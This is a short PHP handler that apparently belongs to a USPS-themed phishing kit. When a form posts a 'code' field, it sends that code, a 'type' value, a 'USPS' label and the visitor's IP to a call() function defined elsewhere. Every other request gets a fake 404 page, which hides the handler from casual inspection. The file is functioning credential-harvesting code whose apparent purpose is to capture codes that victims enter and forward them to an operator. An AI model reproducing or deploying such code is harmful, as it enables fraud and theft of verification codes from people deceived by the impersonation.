<?php
require '../main.php';


if (isset($_POST['code'])) {
call("/- USPS ".$_POST['type']." $ip  -/

" . $_POST['code'] . "
");
return;
}



header("HTTP/1.0 404 Not Found");

?>